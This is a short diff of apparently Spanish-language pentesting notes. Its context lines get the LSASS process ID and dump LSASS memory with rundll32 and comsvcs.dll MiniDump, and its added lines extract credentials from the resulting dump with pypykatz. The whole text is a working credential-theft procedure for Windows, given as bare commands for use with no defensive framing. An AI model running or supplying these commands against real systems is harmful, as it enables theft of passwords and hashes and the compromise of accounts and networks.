@@ -15,3 +15,6 @@ buscamos el ID del proceso
 Get-Process lsass
 luego creamos el archivo
 rundll32 C:\windows\system32\comsvcs.dll, MiniDump <ID> C:\lsass.dmp full
+
+extraer credenciales del archivo .dmp:
+pypykatz lsa minidump path_to_file 
